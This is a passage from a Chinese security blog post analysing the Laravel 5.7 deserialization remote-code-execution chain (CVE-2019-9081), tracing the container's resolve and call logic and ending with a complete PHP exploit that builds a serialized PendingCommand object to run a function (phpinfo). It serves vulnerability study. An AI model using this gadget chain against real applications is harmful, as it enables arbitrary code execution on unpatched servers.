time.</span></span><br><span class="line">    <span class="keyword">if</span> (isset($<span class="built_in">this</span>-&gt;instances[$<span class="keyword">abstract</span>]) &amp;&amp; ! $needsContextualBuild) &#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="built_in">this</span>-&gt;instances[$<span class="keyword">abstract</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $<span class="built_in">this</span>-&gt;with[] = $parameters;</span><br><span class="line"></span><br><span class="line">    $concrete = $<span class="built_in">this</span>-&gt;getConcrete($<span class="keyword">abstract</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// We&#x27;re ready to instantiate an instance of the concrete type registered for</span></span><br><span class="line">    <span class="comment">// the binding. This will instantiate the types, as well as resolve any of</span></span><br><span class="line">    <span class="comment">// its &quot;nested&quot; dependencies recursively until all have gotten resolved.</span></span><br><span class="line">    <span class="keyword">if</span> ($<span class="built_in">this</span>-&gt;isBuildable($concrete, $<span class="keyword">abstract</span>)) &#123;</span><br><span class="line">        $object = $<span class="built_in">this</span>-&gt;build($concrete);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $object = $<span class="built_in">this</span>-&gt;make($concrete);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we defined any extenders for this type, we&#x27;ll need to spin through them</span></span><br><span class="line">    <span class="comment">// and apply them to the object being built. This allows for the extension</span></span><br><span class="line">    <span class="comment">// of services, such as changing configuration or decorating the object.</span></span><br><span class="line">    foreach ($<span class="built_in">this</span>-&gt;getExtenders($<span class="keyword">abstract</span>) as $extender) &#123;</span><br><span class="line">        $object = $extender($object, $<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the requested type is registered as a singleton we&#x27;ll want to cache off</span></span><br><span class="line">    <span class="comment">// the instances in &quot;memory&quot; so we can return it later without creating an</span></span><br><span class="line">    <span class="comment">// entirely new instance of an object on each subsequent request for it.</span></span><br><span class="line">    <span class="keyword">if</span> ($<span class="built_in">this</span>-&gt;isShared($<span class="keyword">abstract</span>) &amp;&amp; ! $needsContextualBuild) &#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;instances[$<span class="keyword">abstract</span>] = $object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $<span class="built_in">this</span>-&gt;fireResolvingCallbacks($<span class="keyword">abstract</span>, $object);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Before returning, we will also set the resolved flag to &quot;true&quot; and pop off</span></span><br><span class="line">    <span class="comment">// the parameter overrides for this build. After those two things are done</span></span><br><span class="line">    <span class="comment">// we will be ready to return back the fully constructed class instance.</span></span><br><span class="line">    $<span class="built_in">this</span>-&gt;resolved[$<span class="keyword">abstract</span>] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    array_pop($<span class="built_in">this</span>-&gt;with);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有两个利用点可以返回 app 对象<br>一.在下方代码 15 行返回<br>二.最后一个 return $object</p>
<ul>
<li>要在 15 行返回 app 对象</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (isset($this-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) &#123;</span><br><span class="line">            return $this-&gt;instances[$abstract];</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$parameters是个空数组取反后为假,再跳转到getContextualConcrete(),$abstract一直都是&quot;Illuminate\Contracts\Console\Kernel&quot;</span><br></pre></td></tr></table></figure>

<p>这里设置 $this-&gt;abstractAliases[Illuminate\Contracts\Console\Kernel]为 new Application();</p>
<p>但是要特别注意下这里的构造函数，容易造成递归调用，导致失败</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __construct($instances=[])&#123;</span><br><span class="line">    $this-&gt;instances[&#x27;Illuminate\Contracts\Console\Kernel&#x27;] =$instances;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>去调用 call 方法,再去跟一下 call 方法</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> call(<span class="variable">$callback</span>, array <span class="variable">$parameters</span> = [], <span class="variable">$defaultMethod</span> = null)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> BoundMethod::call(<span class="variable">$this</span>, <span class="variable">$callback</span>, <span class="variable">$parameters</span>, <span class="variable">$defaultMethod</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>第一个参数是执行的命令,第二个是参数,第 3 个默认为空,继续进入 BoundMethod::call</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public static <span class="keyword">function</span> call(<span class="variable">$container</span>, <span class="variable">$callback</span>, array <span class="variable">$parameters</span> = [], <span class="variable">$defaultMethod</span> = null)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (static::isCallableWithAtSign(<span class="variable">$callback</span>) || <span class="variable">$defaultMethod</span>) &#123;</span><br><span class="line">            <span class="built_in">return</span> static::callClass(<span class="variable">$container</span>, <span class="variable">$callback</span>, <span class="variable">$parameters</span>, <span class="variable">$defaultMethod</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> static::callBoundMethod(<span class="variable">$container</span>, <span class="variable">$callback</span>, <span class="keyword">function</span> () use (<span class="variable">$container</span>, <span class="variable">$callback</span>, <span class="variable">$parameters</span>) &#123;</span><br><span class="line">            <span class="built_in">return</span> call_user_func_array(</span><br><span class="line">                <span class="variable">$callback</span>, static::getMethodDependencies(<span class="variable">$container</span>, <span class="variable">$callback</span>, <span class="variable">$parameters</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们不能进入第一个 if 的返回所以先看看第一个 if 判断, $defaultMethod 是空这个我们不管他</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">protected static <span class="keyword">function</span> isCallableWithAtSign(<span class="variable">$callback</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> is_string(<span class="variable">$callback</span>) &amp;&amp; strpos(<span class="variable">$callback</span>, <span class="string">&#x27;@&#x27;</span>) !== <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里只要命令中不带 @ 就会返回假，所以不会进入 call 中的 if,继续分析 call 下面的代码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">return</span> static::callBoundMethod(<span class="variable">$container</span>, <span class="variable">$callback</span>, <span class="keyword">function</span> () use (<span class="variable">$container</span>, <span class="variable">$callback</span>, <span class="variable">$parameters</span>) &#123;</span><br><span class="line">            <span class="built_in">return</span> call_user_func_array(</span><br><span class="line">                <span class="variable">$callback</span>, static::getMethodDependencies(<span class="variable">$container</span>, <span class="variable">$callback</span>, <span class="variable">$parameters</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>

<p>主要看 call_user_func_array 的第二个参数</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">protected static <span class="keyword">function</span> getMethodDependencies(<span class="variable">$container</span>, <span class="variable">$callback</span>, array <span class="variable">$parameters</span> = [])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$dependencies</span> = [];</span><br><span class="line"></span><br><span class="line">        foreach (static::getCallReflector(<span class="variable">$callback</span>)-&gt;getParameters() as <span class="variable">$parameter</span>) &#123;</span><br><span class="line">            static::addDependencyForCallParameter(<span class="variable">$container</span>, <span class="variable">$parameter</span>, <span class="variable">$parameters</span>, <span class="variable">$dependencies</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> array_merge(<span class="variable">$dependencies</span>, <span class="variable">$parameters</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Foundation&#123;</span><br><span class="line">    class Application</span><br><span class="line">    &#123;</span><br><span class="line">        protected <span class="variable">$instances</span> = [];</span><br><span class="line">        public <span class="keyword">function</span> __construct(<span class="variable">$instances</span>=[])&#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;instances[<span class="string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span>] =<span class="variable">$instances</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Faker&#123;</span><br><span class="line">    class DefaultGenerator</span><br><span class="line">    &#123;</span><br><span class="line">        protected <span class="variable">$default</span>;</span><br><span class="line">        public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;default = array(<span class="string">&quot;abc&quot;</span>=&gt;<span class="string">&quot;KFC&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace Illuminate\Foundation\Testing&#123;</span><br><span class="line"></span><br><span class="line">    use Faker\DefaultGenerator;</span><br><span class="line"></span><br><span class="line">    class PendingCommand</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        protected <span class="variable">$command</span>;</span><br><span class="line">        protected <span class="variable">$parameters</span>;</span><br><span class="line">        public <span class="variable">$test</span>;</span><br><span class="line">        protected <span class="variable">$app</span>;</span><br><span class="line"></span><br><span class="line">        public <span class="keyword">function</span> __construct(<span class="variable">$command</span>, <span class="variable">$parameters</span>,<span class="variable">$instances</span>)&#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;<span class="built_in">command</span> = <span class="variable">$command</span>;</span><br><span class="line">            <span class="variable">$this</span>-&gt;parameters[] = <span class="variable">$parameters</span>;</span><br><span class="line">            <span class="variable">$this</span>-&gt;<span class="built_in">test</span> = new DefaultGenerator();</span><br><span class="line">            <span class="variable">$this</span>-&gt;app = <span class="variable">$instances</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace &#123;</span><br><span class="line">    use Illuminate\Foundation\Testing\PendingCommand;</span><br><span class="line">    use Illuminate\Foundation\Application;</span><br><span class="line">    <span class="variable">$a</span> = new Application();</span><br><span class="line">    <span class="variable">$app</span> = new Application(<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$mm</span> = new PendingCommand(<span class="string">&quot;phpinfo&quot;</span>,1,<span class="variable">$app</span>);</span><br><span class="line">    <span class="built_in">echo</span> base64_encode(serialize(<span class="variable">$mm</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/byname1/article/details/137176425">https://blog.csdn.net/byname1/article/details/137176425</a>（精研）</p>
<p><a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/06/25/Laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BRCE%E9%93%BE%E6%8C%96%E6%8E%98/#%E6%BC%8F%E6%B4%9E%E9%93%BE%E6%8C%96%E6%8E%98">https://mochazz.github.io/2019/06/25/Laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BRCE%E9%93%BE%E6%8C%96%E6%8E%98/#%E6%BC%8F%E6%B4%9E%E9%93%BE%E6%8C%96%E6%8E%98</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45678034/article/details/122292624">https://blog.csdn.net/weixin_45678034&#x2F;article&#x2F;details&#x2F;122292624</a></p>
<p><a target="_blank" rel="noopener" href="https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/">https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/</a></p>
<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-270904.htm">https://bbs.kanxue.com/thread-270904.htm</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/457450028">https://zhuanlan.zhihu.com/p/457450028</a></p>
<p><a target="_blank" rel="noopener" href="https://rivers.chaitin.cn/blog/cq9k9v90lnechd245pr0">https://rivers.chaitin.cn/blog/cq9k9v90lnechd245pr0</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/11079354.html">https://www.cnblogs.com/tr1ple/p/11079354.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/258264">https://www.anquanke.com/post/id/258264</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://ArcNova7.github.io">ArcNova</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://arcnova7.github.io/2026/01/25/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94Laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-9081%EF%BC%89/">https://arcnova7.github.io/2026/01/25/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94Laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-9081%EF%BC%89/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化</a></div><div class="post-share"><div class="social-share" data-image="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/01/25/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/" title="PHP 反序列化——Yii2 反序列化链分析"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">PHP 反序列化——Yii2 反序列化链分析</div></div><div class="info-2"><div class="info-item-1">PHP 反序列化——Yii2 反序列化链分析链路分析12345678vendor/yiisoft/yii2/db/BatchQueryResult.php    | _destruct()::$this-&gt;reset()    | $this-&gt;_dataReader-&gt;close();    vendor/fzaninotto/faker/src/Faker/Generator.php::_call()        | $this-&gt;format($method, $attributes)                | call_user_func_array($this-&gt;getFormatter($formatter), $arguments)        vendor/yiisoft/yii2/rest/IndexAction.php::call_user_func        | public function run()::call_user_func($this-&gt;checkAccess, $this-&gt;id)  ...</div></div></div></a><a class="pagination-related" href="/2026/01/25/%E7%BB%95%E8%BF%87%20open_basedir%20%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/" title="绕过 open_basedir 读取文件系统"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">绕过 open_basedir 读取文件系统</div></div><div class="info-2"><div class="info-item-1">1. 利用 glob:&#x2F;&#x2F; 协议绕过列目录在某些 PHP 版本中，glob:// 协议的处理逻辑存在问题：  open_basedir 检查主要针对常规文件操作函数（如 file_get_contents(), fopen()） glob:// 作为流包装器，在某些 PHP 版本中可能不进行完整的路径检查 特别是配合 DirectoryIterator、GlobIterator 等 SPL 类使用时 PHP 5.3.x - 5.6.x：某些版本中 glob:&#x2F;&#x2F; 不受 open_basedir 限制  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?phpheader(&#x27;Content-Type: text/plain; charset=utf-8&#x27;);echo &quot;=== glob:// 绕过 open_basedir 列目录 ===\n...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/12/08/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94ThinkPHP5.1.37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E6%9E%84%E9%80%A0/" title="PHP反序列化——ThinkPHP5.1.37反序列化链路构造"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-08</div><div class="info-item-2">PHP反序列化——ThinkPHP5.1.37反序列化链路构造</div></div><div class="info-2"><div class="info-item-1">PHP反序列化——ThinkPHP5.1.37反序列化链路构造本文转载于https://xz.aliyun.com/news/6223#toc-2，跟着师傅的文章分析 前置知识 PHP中的namespace命名空间  trait修饰符   Trait 是 PHP 5.4+ 引入的一种代码复用机制，它允许开发者在不同类之间复用方法集合，同时避免了单继承的限制 trait这个东西的出现是为了解决php不支持多继承的问题，一般我们将一些类的公有特性提取出来写成一个trait,然后如果某个类想要使用trait中的东西，只需要使用use关键字把这个trait包含进来就行了 123456789101112trait MyTrait &#123;    public function traitMethod() &#123;        echo &quot;Trait method called&quot;;    &#125;&#125;class MyClass &#123;    use MyTrait;&#125;$obj = new MyClass();$obj-&gt;trai...</div></div></div></a><a class="pagination-related" href="/2025/12/08/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94PHAR%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP反序列化——PHAR反序列化"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-08</div><div class="info-item-2">PHP反序列化——PHAR反序列化</div></div><div class="info-2"><div class="info-item-1">PHP反序列化——PHAR反序列化转载于 https://forum.butian.net/share/2678#(精研) https://forum.butian.net/index.php/share/3007 https://www.freebuf.com/articles/web/291992.html Phar介绍phar，全称为PHP Archive，phar扩展提供了一种将整个PHP应用程序放入.phar文件中的方法，以方便移动、 安装。.phar文件的最大特点是将几个文件组合成一个文件的便捷方式，.phar文件提供了一种将完整的PHP程 序分布在一个文件中并从该文件中运行的方法。 phar文件结构1、stub 一个供phar扩展用于识别的标志，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;，前面内容不限，但必须以 __HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。 2、manifest phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这...</div></div></div></a><a class="pagination-related" href="/2025/12/08/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94ThinkPHP5.1.41%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E6%9E%84%E9%80%A0/" title="PHP反序列化——ThinkPHP5.1.41反序列化链路构造"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-08</div><div class="info-item-2">PHP反序列化——ThinkPHP5.1.41反序列化链路构造</div></div><div class="info-2"><div class="info-item-1">PHP反序列化——ThinkPHP5.1.41反序列化链路构造转载于PHP反序列化——ThinkPHP5.1.41反序列化链路构造from4ut15m大佬 POP链前面部分和thinkPHP 5.1.37中分析的一样  漏洞利用点从windows中的__destruct() 继续分析removefile() 123456789private function removeFiles()&#123;    foreach ($this-&gt;files as $filename) &#123;        if (file_exists($filename)) &#123;            @unlink($filename);        &#125;    &#125;    $this-&gt;files = [];&#125;  这里调用file_exists函数，这里参数被当作字符串处理，所以，会调用该类的_toString魔术方法 1234public function __toString()&#123;    return $this-&gt;toJso...</div></div></div></a><a class="pagination-related" href="/2026/01/25/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/" title="PHP 反序列化——Yii2 反序列化链分析"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-25</div><div class="info-item-2">PHP 反序列化——Yii2 反序列化链分析</div></div><div class="info-2"><div class="info-item-1">PHP 反序列化——Yii2 反序列化链分析链路分析12345678vendor/yiisoft/yii2/db/BatchQueryResult.php    | _destruct()::$this-&gt;reset()    | $this-&gt;_dataReader-&gt;close();    vendor/fzaninotto/faker/src/Faker/Generator.php::_call()        | $this-&gt;format($method, $attributes)                | call_user_func_array($this-&gt;getFormatter($formatter), $arguments)        vendor/yiisoft/yii2/rest/IndexAction.php::call_user_func        | public function run()::call_user_func($this-&gt;checkAccess, $this-&gt;id)  ...</div></div></div></a><a class="pagination-related" href="/2025/12/08/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94Thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%9E%84%E9%80%A0/" title="PHP反序列化——Thinkphp5.0.24反序列化链构造"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-08</div><div class="info-item-2">PHP反序列化——Thinkphp5.0.24反序列化链构造</div></div><div class="info-2"><div class="info-item-1">PHP反序列化——Thinkphp5.0.24反序列化链构造反序列化链构造反序列化起点选择windows类的removefiles()函数 123456789private function removeFiles()&#123;    foreach ($this-&gt;files as $filename) &#123;        if (file_exists($filename)) &#123;            @unlink($filename);        &#125;    &#125;    $this-&gt;files = [];&#125;  调用链路 123456Windows.php:59, think\process\pipes\Windows-&gt;__destruct()Windows.php:163, think\process\pipes\Windows-&gt;removeFiles()Windows.php:163, file_exists()Model.php:2267, think\Model-&gt;__toStri...</div></div></div></a><a class="pagination-related" href="/2025/12/08/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94Thinkphp8.0.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/" title="PHP反序列化——Thinkphp8.0.0反序列化链分析"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-08</div><div class="info-item-2">PHP反序列化——Thinkphp8.0.0反序列化链分析</div></div><div class="info-2"><div class="info-item-1">PHP反序列化——Thinkphp8.0.0反序列化链分析POP链路1234567891011121314151617src/think/route/ResourceRegister.php::__destruct()        | $this-&gt;register()        | $this-&gt;resource-&gt;parseGroupRule($this-&gt;resource-&gt;getRule());        vendor/topthink/think-orm/src/model/concern/Conversion.php::__toString()            | toJson()            | toArray()            | appendAttrToArray(array &amp;$item, $key, array | string $name, array $visible, array $hidden)            | getRelationWith(string $key, ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ArcNova</div><div class="author-info-description">「ArcNova」的网络安全研习录</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">30</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/S3ekit"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ArcNova7" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:123456@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94Laravel5-7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-9081%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">PHP 反序列化——Laravel5.7 反序列化链路分析（CVE-2019-9081）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.2.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">Reference：</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div 